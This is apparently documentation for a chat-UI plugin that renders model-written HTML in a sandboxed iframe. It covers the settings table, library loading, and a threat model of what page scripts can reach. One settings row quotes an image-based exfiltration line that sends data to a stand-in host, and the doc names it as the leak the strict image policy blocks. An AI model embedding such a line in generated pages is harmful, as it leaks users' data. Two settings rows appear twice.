# IUI Settings & soft fence path (`0.13`)

Plugin-only path (no MCP, no dsh core fork, **no Gateway / packs / `:3101` / vLLM**).  
Default: **dsh → FreeLLMAPI (`:3001`) → model**; IUI plugin does systemPrompt / pre-step / steer / stream hints, then mounts ```iui-html sandbox.

Chinese remodel plan: `docs/REDESIGN-SANDBOX-FIRST.zh-CN.md`.

## Settings → IUI

| Control | Default | Meaning |
|---------|---------|---------|
| Theme | `iui-default` | Neutral sandbox theme tokens / DS kit (legacy pack ids resolve here) |
| Fence repair feedback | on | Same-turn repair hint when a fence fails to render |
| Format referee | on | Only when the user explicitly asks for a page (build/show verb + visual artifact) and the reply has none → steer toward ```iui-html |
| Strict image policy | off | Sandbox `img-src` / `font-src` drop the `https:` wildcard: only `data:` / `blob:`, Wikimedia, map tiles and the plugin's own library route. Blocks `new Image().src = "https://x/?d=" + data` exfiltration; arbitrary web images stop loading. Planned default **on** in 0.14 |
| Legacy fences (deprecated) | off | Render old ```` ```iui ```` / ```` ```dsh-ui ```` fences. Off: they stay code blocks (a settled page body gets a **▶ Render as page** button) and the referee asks the model for ```` ```iui-html ````. Plain ```` ```svg ```` opens on the source tab unless the root is `<svg data-iui…>`. Removed in 0.14 |
| Library source | `local` | Where sandbox libraries (Leaflet, Chart.js, three, gsap, mermaid, ag-grid…) load from. `local`: plugin route → jsDelivr → npmmirror. `china`: plugin route → npmmirror → jsDelivr (three/gsap ESM via npmmirror). `global`: jsDelivr → unpkg → plugin route. `custom`: the template below first. Each source times out after 8 s; when all fail, the page strip offers 切换国内源/海外源并重试 (remembered per browser until this setting changes) |
| Custom library URL | — | Only for `custom`: `https://…/{name}@{version}/{file}` (https, must contain `{file}`; its origin is allowed in the frame CSP). Invalid templates fall back to `local` order |
| Library source | `local` | Where sandbox libraries (Leaflet, Chart.js, three, gsap, mermaid, ag-grid…) load from. `local`: plugin route → jsDelivr → npmmirror. `china`: plugin route → npmmirror → jsDelivr (three/gsap ESM via npmmirror). `global`: jsDelivr → unpkg → plugin route. `custom`: the template below first. Each source times out after 8 s; when all fail, the page strip offers 切换国内源/海外源并重试 (remembered per browser until this setting changes) |
| Custom library URL | — | Only for `custom`: `https://…/{name}@{version}/{file}` (https, must contain `{file}`; its origin is allowed in the frame CSP). Invalid templates fall back to `local` order |
| Custom tokens JSON | — | Optional token overrides for sandbox CSS vars |
| User templates JSON | — | HTML/CSS/JS starters the user saved |
| Enable Jev router | **off** | TypeSafe System One format pick; **off without key**. Privacy: when on, each user message's text is sent to the third-party TypeSafe service |
| TypeSafe API key | — | Secret; empty keeps Jev off |
| TypeSafe base URL / model | defaults | Optional overrides (`jev-latest`) |
| Structured Outputs | **auto** | Build/advertise json_schema; degrade to soft fence if unsupported |
| Probe base URL | — | Optional OpenAI-compatible root (e.g. `http://127.0.0.1:3001`) |
| Probe API key | — | Secret for probe only |

**Removed in 0.13 (do not expect these controls):** component pack picker, Gateway transport/sidecar, instance-store persist, frames.sse mount, DIL schema endpoints.

Save applies to **new** fences (hard refresh if the client mirror looks stale).

Endpoints (no secrets):  
`…/assets/response-format.json`, `…/assets/format-router.json`, `…/assets/runtime-config.json`.

## FreeLLMAPI env (optional soft fence)

Host / FreeLLMAPI may expose `IUI_FENCE_*` style hints; they do **not** become sampling constraints. Prefer plugin Settings toggles above.


## Sandbox threat model (what page scripts can see)

Pages are written by the model and run in an iframe with `sandbox="allow-scripts"` only — no `allow-same-origin`, `allow-modals`, `allow-popups`, `allow-forms` or top navigation. The frame has an opaque origin.

A page script **can**:
- read its own html/css/js and anything the user types into it;
- receive host bindings / appData of the **current session**, and only if its source uses them (`data-iui-bind`, `$bind`, `iui-bindings` / `iui-appdata` events, `appData` / `bindings`);
- load images over any `https:` URL (unless **Strict image policy** is on) — this is a data-exfiltration channel for whatever the page can read;
- navigate its own frame to another URL (CSP cannot prevent frame self-navigation).

A page script **cannot**:
- read the host DOM, cookies, localStorage, other chats or other frames;
- read another session's bindings (`bindings.json` / `bindings.sse` require `?session=`, reject cross-site requests and have no "latest session" fallback);
- `fetch` arbitrary hosts (CSP `connect-src` is limited to library CDNs and map/geocode services);
- open system dialogs (`alert` / `confirm` / `prompt` become an in-page toast; `confirm` returns `false`, `prompt` returns `null`);
- send a model turn or fill the composer without a real user click, and then at most 1 per frame per 2 s and 6 per tab per minute;
- open a popup (links go through the host, https/mailto only).

A page that stops responding for 5 s (e.g. `while(true){}`) gets a「页面无响应」overlay with **Stop** (replaces the document, ending its scripts) and **Reload**. Whether the host stays responsive during such a loop depends on the browser putting the opaque sandbox frame in its own process (Chromium site isolation for sandboxed frames); on browsers that do not, the loop can still freeze the tab until Stop takes effect.

Map embeds (`map` node `embed`) are limited to exact provider hosts (OpenStreetMap `export/embed.html`, Google `maps/embed`, Bing `maps/embed`, maps.google.com, uri.amap.com, map.baidu.com); other URLs are shown as a plain link. ```json / no-language code blocks are never auto-rendered: a block that is strictly a page object gets a「▶ 渲染为页面」button instead.

## Sandbox bridge security note

Sandbox iframes are opaque (`sandbox="allow-scripts"` without `allow-same-origin`), so `postMessage` uses `targetOrigin: "*"` with frameId + `event.source === contentWindow` checks. Do not treat `*` alone as sufficient without those checks.
